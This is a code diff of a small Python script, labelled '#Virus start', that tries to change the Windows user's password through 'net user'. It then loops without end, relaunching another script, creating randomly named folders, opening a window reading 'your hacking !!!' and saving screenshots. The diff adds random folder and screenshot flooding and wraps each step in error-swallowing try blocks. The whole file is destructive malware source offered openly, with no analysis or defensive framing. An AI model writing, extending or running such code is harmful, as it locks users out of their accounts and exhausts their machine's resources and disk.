@@ -1,11 +1,8 @@
 import os
+import random
 from tkinter import *
 from PIL import ImageGrab
 
-
-
-#Install the desired library if a pip is installed on the device.
-os.system('pip install pillow')
 
 
 
@@ -13,7 +10,7 @@ os.system('pip install pillow')
 user = os.environ['USERNAME']
 code = 'net user' + user + 'yourhacking!!!@#$$##%$ytyt766'#<password
 os.system(code)
-os.system()
+
 
 
 
@@ -26,16 +23,34 @@ os.system()
 
 #Virus start
 while True:
-    os.startfile("b.py")
+    try:
+        os.startfile("b.py")
+    except:
+        pass
+
+
+    try:
+        name = str(random.randrange(1234567890904903756))
+        os.system(f'mkdir {name}')
+    except:
+        pass
+
 
     #Build window
-    window = Tk()
-    window.title('your hacking !!!')
-    window.minsize(900,800)
-    window.maxsize(900,800)
-    Button(window, text='your hacking !!!').pack()
-    window.mainloop()
+    try:
+        window = Tk()
+        window.title('your hacking !!!')
+        window.minsize(900,800)
+        window.maxsize(900,800)
+        Button(window, text='your hacking !!!').pack()
+        window.mainloop()
+    except:
+        pass
 
     #Take screenshots of the page and save a lot
-    sc = ImageGrab.grab()
-    sc.save('your hacking.png')
+    try:
+        nam = str(random.randrange(123456768677890))
+        sc = ImageGrab.grab()
+        sc.save(nam + '.png')
+    except:
+        pass
